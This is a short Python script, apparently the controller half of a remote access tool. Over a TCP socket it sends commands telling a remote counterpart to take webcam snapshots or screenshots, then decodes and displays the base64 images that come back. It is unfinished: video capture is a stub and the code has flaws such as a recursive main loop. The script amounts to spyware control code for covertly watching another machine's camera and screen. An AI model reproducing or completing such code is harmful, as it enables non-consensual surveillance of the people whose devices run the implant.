import socket, threading, os, base64

HEADER = 64
SERVER = '127.0.0.1'
PORT = 1342
ADDR = ((SERVER, PORT))
FORMAT = 'utf-8'

client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client.connect(ADDR)

def send(msg):
    message = msg.encode(FORMAT)
    msg_length = len(message)
    send_length = str(msg_length).encode(FORMAT)
    client.send(send_length)
    client.send(message)

def main():
    os.system('cls')
    cmd = input('$: ').lower().split(' ')
    if cmd[0] == 'webcam':
        if cmd[1] == 'snap':
            client.send(bytes("sWCP", 'utf-8'))
            decodepic()
        if cmd[1] == 'capture':
           #Put Code for video here
            pass
    elif cmd[0] == 'screen':
        if cmd[1] == 'snap':
            client.send(bytes("sSS", 'utf-8'))
            decodepic()
    
    main()



def decodepic():
    from PIL import Image
    import io
    image = client.recv(1500000).decode("utf-8")
    image = io.BytesIO(base64.b64decode(image))
    pilimage = Image.open(image)
    pilimage.show()

main()